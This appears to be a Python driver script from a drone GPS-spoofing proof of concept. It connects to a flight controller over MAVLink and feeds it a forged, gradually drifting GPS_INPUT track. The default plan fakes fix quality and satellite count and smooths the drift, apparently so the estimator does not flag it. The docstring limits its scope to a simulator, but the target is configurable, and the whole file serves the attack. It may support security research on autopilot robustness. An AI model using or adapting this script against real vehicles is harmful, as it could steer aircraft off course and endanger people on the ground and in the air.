"""Local post-access companion bridge for the B-path SITL PoC.

This is not an exploit, scanner, or remote-access tool. It models the point
after a companion computer, relay, or maintenance-side process is already in a
trusted MAVLink input position in an authorized SITL testbed.

The bridge reads a local JSON plan and forwards a kinematically consistent
GPS_INPUT drift sequence to the flight controller.
"""

from __future__ import annotations

import argparse
import json
from pathlib import Path

from attack_agent import GhostPilotAttack
from utils import Log


DEFAULT_PLAN = {
    "baseline_lat": 37.5665,
    "baseline_lon": 126.9780,
    "baseline_alt": 20.0,
    "iterations": 20,
    "interval": 0.25,
    "step_m": 1.0,
    "bearing_deg": 45.0,
    "gps_id": 0,
    "fix_type": 3,
    "satellites": 12,
    "hacc": 0.8,
    "vacc": 1.2,
    "sacc": 0.25,
    "warmup_sec": 10.0,
    "consistency_profile": "ekf-smooth",
    "max_accel": 0.6,
    "max_speed": 2.5,
}


def load_plan(path: Path | None) -> dict:
    plan = dict(DEFAULT_PLAN)
    if path is not None:
        with path.open(encoding="utf-8") as f:
            plan.update(json.load(f))
    return plan


def write_template(path: Path) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as f:
        json.dump(DEFAULT_PLAN, f, indent=2, sort_keys=True)
        f.write("\n")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="tcp:127.0.0.1:5760")
    parser.add_argument("--plan", type=Path, default=None)
    parser.add_argument("--write-template", type=Path, default=None)
    parser.add_argument("--set-gps-type", action="store_true")
    parser.add_argument("--verify", action="store_true")
    args = parser.parse_args()

    if args.write_template is not None:
        write_template(args.write_template)
        Log.info(f"wrote companion plan template: {args.write_template}")
        return

    plan = load_plan(args.plan)
    Log.attack("post-access companion bridge model: local SITL plan -> trusted MAVLink GPS_INPUT")
    Log.attack("scope: no exploit, no credential bypass, no RF link, no real vehicle")

    attacker = GhostPilotAttack(args.target)
    attacker.baseline = {
        "lat": float(plan["baseline_lat"]),
        "lon": float(plan["baseline_lon"]),
        "alt": float(plan["baseline_alt"]),
    }
    if args.set_gps_type:
        attacker.set_mavlink_gps_type()

    attacker.ghost_gps_input(
        iterations=int(plan["iterations"]),
        interval=float(plan["interval"]),
        step_m=float(plan["step_m"]),
        bearing_deg=float(plan["bearing_deg"]),
        gps_id=int(plan["gps_id"]),
        gps_engine="gps-input",
        fix_type=int(plan["fix_type"]),
        satellites=int(plan["satellites"]),
        hacc=float(plan["hacc"]),
        vacc=float(plan["vacc"]),
        sacc=float(plan["sacc"]),
        verify=args.verify,
        warmup_sec=float(plan["warmup_sec"]),
        consistency_profile=str(plan["consistency_profile"]),
        max_accel=float(plan["max_accel"]),
        max_speed=float(plan["max_speed"]),
    )


if __name__ == "__main__":
    main()
